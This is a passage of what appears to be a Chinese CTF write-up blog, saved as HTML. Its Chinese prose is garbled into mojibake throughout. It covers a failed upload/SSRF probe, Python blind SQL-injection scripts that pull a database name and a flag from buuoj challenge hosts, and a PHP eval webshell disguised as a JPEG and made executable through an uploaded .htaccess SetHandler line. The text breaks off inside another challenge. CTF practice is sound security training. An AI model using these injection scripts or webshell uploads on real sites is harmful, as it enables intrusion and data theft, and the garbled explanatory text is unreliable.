class="hljs-name">script</span>&gt;</span><br>è¿™æ„å‘³ç€æœåŠ¡å™¨å¯èƒ½åŒæ—¶åšäº†ä¸¤ä»¶äº‹ï¼š<br><br>å°†æ–‡ä»¶å†…å®¹ä¿å­˜åˆ°ç£ç›˜ï¼ˆå¦‚ uploads/shell.phpï¼‰ã€‚<br><br>ç”Ÿæˆä¸€ä¸ªåŒ…å«è¯¥å†…å®¹çš„ Base64 å›¾ç‰‡ç”¨äºå‰ç«¯å±•ç¤ºã€‚<br><br>æ½œåœ¨æ¼æ´ç‚¹ï¼š<br><br>å¦‚æœæœåŠ¡å™¨ä¿å­˜äº†åŸå§‹æ–‡ä»¶ï¼ˆå¦‚ .phpï¼‰ï¼Œä¸”æ–‡ä»¶åå¯æ§ï¼Œå¯ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶æ‰§è¡Œä»£ç ã€‚<br><br>å¦‚æœæœåŠ¡å™¨ä»…è¿”å› Base64 å›¾ç‰‡ä½†æœªä¿å­˜åŸå§‹æ–‡ä»¶ï¼Œéœ€å¦å¯»ä»–æ³•ã€‚<br></code></pre></td></tr></table></figure>
<p>è¯•ä¸€ä¸‹å¯¹uploadæ–‡ä»¶  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">223.112</span>.<span class="hljs-number">5.141</span>:<span class="hljs-number">63478</span><span class="hljs-regexp">/upload?file_path=flag.txthttp:/</span><span class="hljs-regexp">/223.112.5.141:63478/u</span>pload?file_path=flag.txt<br></code></pre></td></tr></table></figure>
<p>å¯¹uploadè¯•äº†ä¸€ä¸‹ç›®å½•ç©¿è¶Šï¼Œä¸è¡Œï¼Œ  </p>
<p>ä¼ªåè®®<br>encodeï¼Œæ— æ³•è¯»å–æ–‡ä»¶ï¼Œ<br>decodeï¼Œæ— æ³•è¯»å–æ–‡ä»¶</p>
<p>æ³¨æ„åˆ°æ— è®ºä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶æœåŠ¡å™¨é»˜è®¤å½“ä½œimag&#x2F;pngæ–‡ä»¶å¤„ç†</p>
<p><a target="_blank" rel="noopener" href="http://223.112.5.141:53908/upload?file_path=http://127.0.0.1/flag.txt">http://223.112.5.141:53908/upload?file_path=http://127.0.0.1/flag.txt</a><br>ä¸è¡Œ<br>æ”¾å¼ƒäº†ï¼Œç­‰wp  </p>
<hr>
<h2 id="title-note-32date-2025-05-01-02-13-13tags-web"><a href="#title-note-32date-2025-05-01-02-13-13tags-web" class="headerlink" title="title: note-32date: 2025-05-01 02:13:13tags: web"></a>title: note-32<br>date: 2025-05-01 02:13:13<br>tags: web</h2><h1 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h1><p>buucfté‡Œæç¤ºæœ‰sqlï¼Œä¸Šæ¥ç»™äº†ä¸ªè¾“å…¥æ¡†ï¼Œä½†æ˜¯æ˜¯postè€Œï¼ŒæŠ“åŒ…çœ‹ï¼š  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">4</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Origin</span>: http://cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åå°±æ˜¯å¯¹idè¿›è¡Œæ³¨å…¥äº†,<br>ç”¨bp fuzzä¸€ä¸‹,å¤§æ¦‚è¿‡æ»¤äº†</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ç©ºæ ¼<br>or<br><span class="hljs-string">||</span><br>and<br><span class="hljs-meta">&amp;&amp;</span><br><span class="hljs-string">&quot;</span><br><span class="hljs-punctuation">;</span><br>&#x27;xmlupdate()<br>/**/<br>`<br></code></pre></td></tr></table></figure>
<p>è¯•å‡ºå¦‚ä¸‹</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">1^(length(database())=2)<br><br>è‹¥æ˜¯lengthæ˜¯å¯¹çš„ä¼šè¿”å›ï¼š<br><span class="hljs-keyword">Error </span>Occured When Fetch Result.<br><br>å¦åˆ™è¿”å›ï¼š<br>Hello, glzjin wants a girlfriend.<br></code></pre></td></tr></table></figure>
<p>ç”±æ­¤å¯ä»¥å¯¹è¿›è¡Œç›²æ³¨<br>å…ˆç”¨bpå·²ç»æµ‹è¯•å‡ºæ•°æ®åº“é•¿åº¦ä¸º11ï¼›<br>æ‰¾ä¸ªè„šæœ¬æ”¹æ”¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># str= &quot;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&quot;</span><br>url = <span class="hljs-string">&#x27;http://69638964-21bc-445d-a323-6de57b0ff6bb.node5.buuoj.cn:81/&#x27;</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">10</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.2</span>) <br>        payload = <span class="hljs-string">&#x27;1^(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(i,l)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing æ•°æ®åº“åç§°ç¬¬:&quot;</span>,i,<span class="hljs-string">&quot;ç¬¬ä¸ª&quot;</span>,<span class="hljs-built_in">chr</span>(l),<span class="hljs-string">&quot;å­—ç¬¦&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name+<span class="hljs-built_in">chr</span>(l)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ•°æ®åº“åç§°ï¼š&quot;</span>,name)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;ç¬¬&quot;,i,&quot;ä¸ªå­—ç¬¦ï¼š &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;è¡¨åé•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;å…¨è¡¨åé•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;è¡¨å:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># flag=&#x27;&#x27;</span><br><span class="hljs-comment"># for l in range (1,10000):</span><br><span class="hljs-comment">#     f=&#x27;&#x27;</span><br><span class="hljs-comment">#     for s in range (32,127):</span><br><span class="hljs-comment">#         time.sleep(0.08)</span><br><span class="hljs-comment">#         f=flag + chr(s)</span><br><span class="hljs-comment">#         payload = &#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(f)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             flag=flag + chr(s-1)</span><br><span class="hljs-comment">#             print(flag.lower)</span><br><span class="hljs-comment">#             break</span><br><br></code></pre></td></tr></table></figure>
<p>å…ˆè·‘å‡ºæ•°æ®åº“åï¼š<br>ctftraining<br>ç„¶åé¢˜ç›®ç»™äº†è¡¨æ˜å’Œåˆ—æ˜ï¼Œé‚£ç›´æ¥çˆ†flagå°±è¡Œï¼Œé‚£æˆ‘è·‘åº“åå¹²ä»€ä¹ˆï¼Ÿ<br>å°±å½“æµ‹è¯•å§  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># str= &quot;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&quot;</span><br>url = <span class="hljs-string">&#x27;http://b74d121d-ae37-46c5-9e40-49750c875c6b.node5.buuoj.cn:81/index.php&#x27;</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> le <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    payload= <span class="hljs-string">&#x27;1^((length((select(flag)from(flag))))&lt;&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(le)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æµ‹è¯•flagé•¿åº¦ä¸­:&quot;</span>,le)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flagé•¿åº¦ä¸º:&quot;</span>,le)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,le+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">117</span>):<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        payload = <span class="hljs-string">&#x27;1^((ascii(substr((select(flag)from(flag)),&#123;&#125;,1)))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(i,l)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flagåç§°ç¬¬:&quot;</span>,i,<span class="hljs-string">&quot;ä¸ªå­—ç¬¦&quot;</span>,<span class="hljs-built_in">chr</span>(l),<span class="hljs-string">&#x27;    &#x27;</span>,flag)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag=flag+<span class="hljs-built_in">chr</span>(l)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>,flag)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;ç¬¬&quot;,i,&quot;ä¸ªå­—ç¬¦ï¼š &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;è¡¨åé•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;å…¨è¡¨åé•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;è¡¨å:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># flag=&#x27;&#x27;</span><br><span class="hljs-comment"># for l in range (1,10000):</span><br><span class="hljs-comment">#     f=&#x27;&#x27;</span><br><span class="hljs-comment">#     for s in range (32,127):</span><br><span class="hljs-comment">#         time.sleep(0.08)</span><br><span class="hljs-comment">#         f=flag + chr(s)</span><br><span class="hljs-comment">#         payload = &#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(f)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             flag=flag + chr(s-1)</span><br><span class="hljs-comment">#             print(flag.lower)</span><br><span class="hljs-comment">#             break</span><br></code></pre></td></tr></table></figure>
<p>å¯èƒ½æ˜¯æˆ‘æ˜¨æ™šåšè¿·ç³Šäº†ï¼Œå¡åœ¨lengthå’Œsubstré‡Œé¢ç”¨selectéœ€è¦å†åŠ ä¸€å±‚æ‹¬å·é‡Œï¼Œå¡äº†ä¸€ä¸ªåŠå°æ—¶ï¼Œåˆ°å‡Œæ™¨3ç‚¹åŠï¼Œ<br>ä¸€é“é¢˜åšäº†ä¸‰ä¸ªåŠå°æ—¶ï¼Œé“å¿ƒç ´ç¢äº†ï¼›<br>è‡³å°‘æœ€åç‹¬ç«‹åšå‡ºæ¥äº†ï¼›<br>flag{e53ac9ec-ab18-44e9-89b4-f1b39d8f813c}</p>
<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>å…ˆä¼ ä¸ªğŸçœ‹çœ‹ï¼š  </p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">ä¼ phpæœ¨é©¬ï¼š<br>å›æ˜¾ï¼šåç¼€åä¸èƒ½æœ‰phï¼<br><br>ä¼ æ­£å¸¸pngæ–‡ä»¶ï¼š<br>ä¸Šä¼ ç±»å‹ä¹Ÿå¤ªéœ²éª¨äº†å§ï¼<br><br>ä¼ <span class="hljs-keyword">jpgçœ‹çœ‹ï¼š</span><br><span class="hljs-keyword"></span>ä¸Šä¼ ç±»å‹ä¹Ÿå¤ªéœ²éª¨äº†å§ï¼<br></code></pre></td></tr></table></figure>
<p>ä¸ç®¡äº†ï¼ŒbpæŠ“åŒ…æ”¹  </p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery">Content-Disposition: form-data;<span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;uploaded&quot;</span>; filename=<span class="hljs-string">&quot;shell.jpeg&quot;</span><br>Content-Type: image/jpeg<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[zhong]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br>æˆåŠŸï¼š<br>/var/www/html/upload/<span class="hljs-number">407</span>deea951641fdc86613277efecd816/shell.jpeg succesfully uploaded!<br></code></pre></td></tr></table></figure>
<p>åœ¨æµè§ˆå™¨ä¸Šè®¿é—®æˆåŠŸï¼Œä½†æ˜¯ç”¨èš‚èšè¿æ¥ä¸ä¸Šï¼Œåº”è¯¥ä¹Ÿæ˜¯æ²¡ç›®å½•æ²¡phpè§£æçš„é—®é¢˜ï¼Œ<br>è§‚å¯Ÿåˆ°æœåŠ¡å™¨ç«¯ä¸ºapache<br>é‚£åº”è¯¥å°±æ˜¯å°è¯•.htaccess</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;uploaded&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;.htaccess&quot;</span><br><span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/jpeg</span><br><br>SetHandler application<span class="hljs-symbol">/x-httpd-php</span><br><br><span class="hljs-symbol">/var/www/html/upload/407deea951641fdc86613277efecd816/.htaccess</span> succesfully uploaded<span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure>
<p>èš‚èšè¿æ¥æˆåŠŸï¼Œåœ¨æ ¹ç›®å½•æ‰¾åˆ°flag<br>æœ¬æ¥çœ‹åˆ°è¿™ä¸²è·¯å¾„æˆ‘è¿˜ä»¥ä¸ºæ˜¯éšæœºç›®å½•ä¹‹ç±»çš„    </p>
<p>ä¹˜æœºè¯•äº†ä¸€ä¸‹ï¼Œæƒ³åœ¨.htaccessæ–‡ä»¶ä¸­ç›´æ¥æ·»åŠ æœ¨é©¬ï¼Œç»“æœè¿ä¸ä¸Šï¼Œå¯èƒ½æ˜¯ä¸è¡Œå§<br>åœ¨uploadç›®å½•ä¸‹æå¾—ï¼Œè¿˜æŠŠç¯å¢ƒæåäº†</p>
<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>æ‰“å¼€é¢˜ç›®ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123; <span 